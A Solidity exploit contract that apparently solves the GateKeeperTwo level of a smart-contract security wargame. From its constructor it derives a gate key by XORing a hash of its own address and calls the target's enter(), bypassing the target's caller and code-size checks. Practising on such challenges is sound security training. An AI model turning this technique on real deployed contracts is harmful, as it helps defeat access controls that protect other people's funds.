// SPDX-License-Identifier: MIT

interface GateKeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}

pragma solidity ^0.8.0;

contract Attack {

    GateKeeperTwo private target;

    constructor(address _targetAddr) {
        target = GateKeeperTwo(_targetAddr);
        bytes8 gateKey = bytes8(keccak256(abi.encodePacked(address(this)))) ^ bytes8(type(uint64).max);
        target.enter(gateKey);
    }
}
